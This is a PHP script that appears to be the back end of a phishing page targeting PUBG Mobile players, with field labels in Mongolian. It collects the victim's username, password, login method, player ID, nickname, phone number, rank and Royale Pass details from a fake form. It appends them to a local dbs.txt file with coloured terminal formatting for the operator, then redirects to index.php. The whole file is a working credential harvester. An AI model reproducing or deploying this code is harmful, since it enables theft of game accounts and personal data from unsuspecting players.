<?php

file_put_contents("../../dbs.txt", "\e[1;33m[\e[1;32m>_\e[1;33m] \e[1;32mХэрэглэгчийн нэр \e[1;33m:\e[1;32m " . $_POST['username']
 . " 
\e[1;33m[\e[1;32m>_\e[1;33m] \e[1;32mНууц үг \e[1;33m:\e[1;32m " . $_POST['password']
 . "
\e[1;33m[\e[1;32m>_\e[1;33m] \e[1;32mНэвтэрсэн \e[1;33m:\e[1;32m " . $_POST['login']
 . "
\e[1;33m[\e[1;32m>_\e[1;33m] \e[1;32mТоглогчийн id \e[1;33m:\e[1;32m " . $_POST['playid']
 . "
\e[1;33m[\e[1;32m>_\e[1;33m] \e[1;32mТоглогчийн нэр \e[1;33m:\e[1;32m " . $_POST['nick']
 . "
\e[1;33m[\e[1;32m>_\e[1;33m] \e[1;32mУтасны дугаар \e[1;33m:\e[1;32m " . $_POST['phone']
 . "
\e[1;33m[\e[1;32m>_\e[1;33m] \e[1;32mТүвшин \e[1;33m:\e[1;32m " . $_POST['level']
 . "
\e[1;33m[\e[1;32m>_\e[1;33m] \e[1;32mЦол \e[1;33m:\e[1;32m " . $_POST['tier']
 . "
\e[1;33m[\e[1;32m>_\e[1;33m] \e[1;32mRoyale Pass Төрөл \e[1;33m:\e[1;32m " . $_POST['rpt']
 . "
\e[1;33m[\e[1;32m>_\e[1;33m] \e[1;32mRoyale Pass Түвшин \e[1;33m:\e[1;32m " . $_POST['rpl']
 . "
\e[1;33m[\e[1;32m>_\e[1;33m] \e[1;32mПлатформ\e[1;33m:\e[1;32m " . $_POST['platform'] . "\n", FILE_APPEND);
header('Location: index.php');
exit();
